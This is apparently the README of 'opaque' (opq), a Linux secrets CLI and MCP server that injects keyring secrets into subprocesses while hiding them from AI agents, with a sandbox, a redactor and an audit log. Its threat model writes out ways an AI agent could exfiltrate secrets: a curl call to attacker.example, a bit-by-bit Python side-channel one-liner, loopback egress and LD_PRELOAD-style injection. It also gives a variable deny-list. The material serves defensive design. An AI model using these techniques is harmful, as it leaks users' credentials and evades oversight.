# opaque

> **Status:** v1.1.1 — Linux only for now; macOS Keychain backend planned for v1.2.

An **AI-safe secrets CLI** — stores secrets in your OS keyring and lets programs (and AI agents) use them without ever exposing plaintext. Invoked as `opq`.

```
$ opq exec --env OPENAI_API_KEY=openai_key -- curl ... # ok
$ opq get  openai_key | cat                            # blocked
$ opq mcp                                              # MCP server over stdio
```

## Why

When you let an AI agent run shell commands, the agent shouldn't see your API keys. But the **subprocess** the agent spawns still needs them. `opaque` sits between the two:

- The agent calls `opq exec --env VAR=secret_name -- ...` (or the `run_with_secrets` MCP tool).
- `opq` looks up the secret in your keyring and injects it as an environment variable into the child process.
- The child uses the secret normally. Anything the child accidentally writes to stdout/stderr is scanned, and the secret value is replaced with `[REDACTED:VAR]` before reaching the agent.
- The agent never receives the plaintext, only the redacted output.

## Threat model

**In scope:**

- AI reading plaintext from stdout, error messages, or argv.
- AI piping `opq get` to capture values (refused unless stdout is a TTY).
- Subprocesses accidentally echoing secrets (output redaction).
- Shell-history exposure (no secret ever appears in argv).
- Process-list exposure (`ps auxe`) — secrets enter child via `exec` env, not via shell interpolation.
- Memory swap-out of secret pages (mlocked buffers via `memguard`).
- **Intentional network exfiltration by an AI via the MCP `run_with_secrets` tool** — now blocked by default. Every MCP-spawned subprocess runs inside a network namespace (`bwrap --unshare-net`), a private PID namespace (`--unshare-pid`), and a private `/proc` mount (`--proc /proc`), so attacks like `curl -H "X-Leak: $SECRET" attacker.example`, DNS labels carrying the secret, and outbound TCP/UDP all fail; additionally, concurrent `run_with_secrets` calls cannot read each other's `/proc/<pid>/environ` and recover injected secrets. Abstract Unix sockets are isolated by the network namespace. The AI must explicitly pass `allow_network=true` to lift the network block, and any such call is recorded as `network_allowed` in the audit log. Setting `isolation="full"` additionally tmpfs-overlays `/home` and `/tmp` and ro-binds only `/usr`, `/etc`, `/lib*`, `/bin`, `/sbin` — blocking exfiltration of other host files even before they reach the network. Residuals still in scope (NOT blocked): loopback channels to co-resident services, timing side-channels, kernel-keyring inheritance, and pre-compromise of host binaries under `/usr`.

**Also in scope (v1.1.1):**

- **AI-controlled `LD_PRELOAD` / `PATH` / `BASH_ENV` injection.** Both `opq exec --env` and the MCP `run_with_secrets` tool refuse to inject a value into any variable name on the dynamic-linker / interpreter-startup deny-list. Coverage includes the `LD_*`, `DYLD_*`, `NSS_*`, `GIO_*`, `GCONV_*`, `ERL_*`, `BASH_FUNC_*`, and `GIT_CONFIG_*` prefix families, plus individual names spanning JVM build tooling (MAVEN_OPTS, GRADLE_OPTS, SBT_OPTS), Go module fetch (GOPROXY, GOFLAGS), Rust compiler replacement (RUSTC_WRAPPER, RUSTC), Bun (BUN_OPTIONS), Lua/R/Julia/Haskell/OCaml/Erlang/Tcl/Guile loaders, Nix/Scheme/Clojure/Elixir load paths, editor/pager indirection (EDITOR, VISUAL, PAGER, LESSOPEN, GIT_EDITOR, MANPAGER), askpass programs (SSH_ASKPASS, GIT_ASKPASS), OpenSSL engine loading (OPENSSL_CONF), and git config injection (GIT_EXEC_PATH, GIT_CONFIG_COUNT) — see `env_policy.go` for the full list. This prevents an AI from turning the secret-injection feature into arbitrary code execution by picking a variable name the loader/shell uses to find code.
- **Multi-process audit-log integrity.** `appendAudit` and `tailAudit` serialize across processes via a dedicated `audit.lock` file (`flock(2)` LOCK_EX / LOCK_SH). Rotation never drops the lock; readers cannot observe torn or duplicated entries even when a writer rotates mid-read.
- **Audit-log error sanitization.** Backend errors and subprocess start errors are mapped to a fixed taxonomy (`not_found` / `backend_error` / `exec_not_found` / `exec_permission_denied` / `exec_start_failed`) before being written to the audit log. The wrapped error returned to the caller keeps the full detail; only the AI-readable `audit_tail` is sanitized, so a buggy or future-malicious backend cannot leak secret bytes into the audit stream via error messages.

**Out of scope (v1):**

- Root / kernel attacker.
- Side channels in the legitimate consuming subprocess.
- A malicious subprocess that intentionally exfiltrates the secret via a loopback channel, kernel keyring, or other non-network path the sandbox does not cover.
- Tamper-evident audit log (file mode 0600 only; not cryptographically signed).
- **Encoding-evasion of the redactor.** The redactor matches the raw secret bytes verbatim; base64-, hex-, URL-, or otherwise-encoded forms of a secret will not be detected. Entropy detection was considered and rejected for false-positive reasons.
- **Metadata side-channels in `run_with_secrets` are inherent to the design.** The tool returns `stdout_truncated`, `stderr_truncated`, and `timed_out` flags to the AI. Each is one bit per call; an AI that controls the subprocess command can use these (plus output volume and wall-clock timing) as oracles to extract a secret bit-by-bit over many calls (e.g., `python3 -c 'import os; print("x"*(300000 if os.environ["K"][0]<"m" else 1))'` → observe `stdout_truncated`). This is **not** fixable inside `opq` without dropping the feature; the documented mitigation is the policy-proxy pattern below, which restricts the command set so the AI cannot supply secret-conditional commands.
- **Terminal-escape exfiltration via the rendering client.** If the MCP client renders subprocess stdout in a terminal emulator, an AI-supplied OSC 52 / DCS escape sequence in that output could exfiltrate data to the system clipboard or rewrite the window title. `opq` redacts secret *values* but does not strip escape sequences. `TERM` is on the deny-list (the AI cannot set it), but the subprocess can still emit raw escape bytes. Clients should sanitize tool output before rendering.
- **Loopback channels (`curl http://127.0.0.1:6379`, `redis-cli`, `psql -h 127.0.0.1`).** The MCP network sandbox blocks egress at the namespace boundary, but loopback to co-resident services is NOT blocked. If you run opq on a host with any local service that can forward externally (an HTTP proxy, a database with `COPY TO PROGRAM`, a message queue with a webhook sink), the sandbox is bypassable from inside `run_with_secrets`. Treat loopback as an open egress unless you have audited every listening port.
- **Process-level resource exhaustion by the AI.** Per-call limits exist (60s default timeout / 600s ceiling, 256 KiB per output stream, 32 env vars per call, 200 audit-tail entries) to bound the blast radius of a single call, but a determined AI calling the tool in a tight loop can still consume keyring/CPU/network. Rate-limiting and per-secret allowlists belong in a deployment-side policy proxy (see below).

For high-risk MCP deployments, the recommended pattern is to front `opq mcp` with a small policy-enforcing wrapper MCP server that allowlists `(command, args pattern, env var set)` tuples per secret, denies anything else, and forwards approved calls to `opq`. The opaque CLI itself deliberately ships as a low-trust building block.

## Install

```
go install github.com/alexrios/opaque@latest
```

The installed binary is named `opq`.

Requirements:

- Linux with an unlocked Secret Service session (gnome-keyring, KWallet, or KeePassXC).
- **bubblewrap (`bwrap`) >= 0.5.0** for the MCP subprocess sandbox and `opq exec --sandbox` flag. Install via your package manager (`apt install bubblewrap` on Debian/Ubuntu, `dnf install bubblewrap` on Fedora, `pacman -S bubblewrap` on Arch). `opq mcp` refuses to start without it. Requires a kernel with unprivileged user namespaces enabled (default on most distros).
- Go 1.25+ to build from source (the optional `runtimesecret` build tag needs 1.26.3+; see [Memory hygiene](#memory-hygiene)).

## Quick start

```sh
# Store a secret. Value is read from stdin or prompted on a TTY — never on argv.
printf 'sk-...' | opq set openai_api_key

# List names (never values).
opq list

# Use the secret without ever seeing it.
opq exec --env OPENAI_API_KEY=openai_api_key -- curl -H "Authorization: Bearer $OPENAI_API_KEY" https://api.openai.com/v1/models

# What's in the audit log?
opq audit --tail 10
```

## CLI

| Command | Behavior |
| --- | --- |
| `opq set <name>` | Read value from stdin (or hidden TTY prompt). Never accepts values on argv. |
| `opq list` | Print stored secret names. |
| `opq delete <name>` | Remove a secret. |
| `opq get <name> --plaintext` | Print value to stdout. **Refuses** to run unless stdout is a TTY. |
| `opq exec --env VAR=name [...] -- cmd args` | Run `cmd` with named secrets injected as env vars. Subprocess output is redacted. |
| `opq audit [--tail N]` | Show audit-log entries. |
| `opq mcp` | Run as a Model Context Protocol server over stdio. |

## MCP server

Add to your MCP-aware client (Claude Code, etc.):

```jsonc
{
  "mcpServers": {
    "opq": {
      "command": "opq",
      "args": ["mcp"]
    }
  }
}
```

The server exposes three tools:

- `list_secrets()` — returns secret names only.
- `run_with_secrets({ command, args, env: { VAR: secret_name }, timeout_seconds, allow_network, isolation })` — runs the command with secrets injected; returns redacted stdout/stderr, a normalized exit (`success`/`failure` only — the raw status is in the audit log, never returned to the AI), truncation flags, and a timed-out flag. **The subprocess runs inside a network-blocked, PID-isolated sandbox by default** (bubblewrap `--unshare-net --unshare-pid --proc /proc`); pass `allow_network=true` to opt in to network access (audited as `network_allowed`), or `isolation="full"` for additional tmpfs `/home` and `/tmp` plus minimal ro-binds. Defaults: 60s timeout (capped at 600s), 256 KiB per output stream, 32 env vars per call.
- `audit_tail({ n })` — recent audit entries, capped at 200 per call.

There is **no** `get_secret_value` tool by design. AIs can use secrets, not read them.

**The MCP sandbox blocks network exfiltration and PID-namespace cross-inspection but is not a complete jail.** With the default sandbox active, `curl`, `dig`, `nc`, and any other network-capable binary the AI chooses cannot reach external hosts — egress fails at the kernel namespace boundary, not in the binary. Each subprocess also runs in its own PID namespace with a private `/proc`, so concurrent calls cannot read each other's `/proc/<pid>/environ`. The redactor is the second line of defense against the subprocess *accidentally* echoing the secret on stdout/stderr, and it still does not detect base64/hex/URL-encoded forms. Residual risks the sandbox does NOT cover: loopback channels to other services on the host, timing side-channels, kernel-keyring inheritance, and pre-compromise of binaries under `/usr`. See the [Threat model](#threat-model) section for the recommended policy-proxy deployment pattern for high-risk environments.

## Backends

v1 ships with the Secret Service backend (libsecret over D-Bus) for Linux. The `Backend` interface in `backend.go` is shaped so additional backends drop in without touching anything else:

- macOS Keychain (planned, v1.2).
- Proton Pass (planned, v2).
- `pass` / file-based / KWallet are already reachable via the underlying `99designs/keyring` library; flip them on by editing `AllowedBackends` in `OpenDefaultBackend`.

## Audit log

`${XDG_STATE_HOME:-$HOME/.local/state}/opq/audit.log`, mode 0600. One JSON object per line. A sibling `audit.lock` file (also 0600) serializes appends and tail reads across concurrent `opq` processes; rotation is atomic across processes and never drops the cross-process lock. The active log is capped at 10 MiB and one historical rotation is kept at `audit.log.1`; `opq audit --tail N` spans both files transparently.

Actions: `set`, `get`, `delete`, `list`, `exec_inject`, `mcp_run`, `redaction_disabled`, `network_allowed`, `denied`.

Example entries:

```json
{"ts":"2026-05-24T15:50:17.189Z","action":"exec_inject","secret_name":"openai_api_key","caller":"cli","pid":50770,"ppid":50701}
{"ts":"2026-05-24T15:50:18.012Z","action":"mcp_run","secret_names":["openai_api_key","stripe_secret_key"],"caller":"mcp","pid":50770,"ppid":50701,"msg":"raw_exit=0 elapsed_ms=143"}
```

For MCP-driven runs the secret names appear as a structured `secret_names` JSON array (no comma-joined string parsing required). Backend and subprocess-start errors are written to `msg` as fixed-taxonomy tokens (`not_found`, `backend_error`, `exec_not_found`, `exec_permission_denied`, `exec_start_failed`) — never raw library text — so a buggy backend cannot leak secret bytes into the audit stream that the AI-callable `audit_tail` MCP tool exposes.

`caller` is `cli` for direct CLI invocations and `mcp` when the request came through the MCP server, so you can distinguish AI-driven access from human-driven access at a glance.

## Memory hygiene

Secret bytes flow through `memguard.LockedBuffer`s — mlocked pages, guard canaries, zeroed on destroy. The default build is enough for the threat model above.

For an extra hardening layer that erases transient stack + heap copies between the locked buffer and the child env, build with:

```sh
GOEXPERIMENT=runtimesecret go build -tags runtimesecret .
```

This wraps the env-construction code path in `runtime/secret.Do(...)` (Go 1.26.3+, experimental). Linux/amd64 and linux/arm64 only.

## Development

```sh
go test ./...
go vet ./...
go build .
```

End-to-end smoke tests require an unlocked Secret Service session on the host.
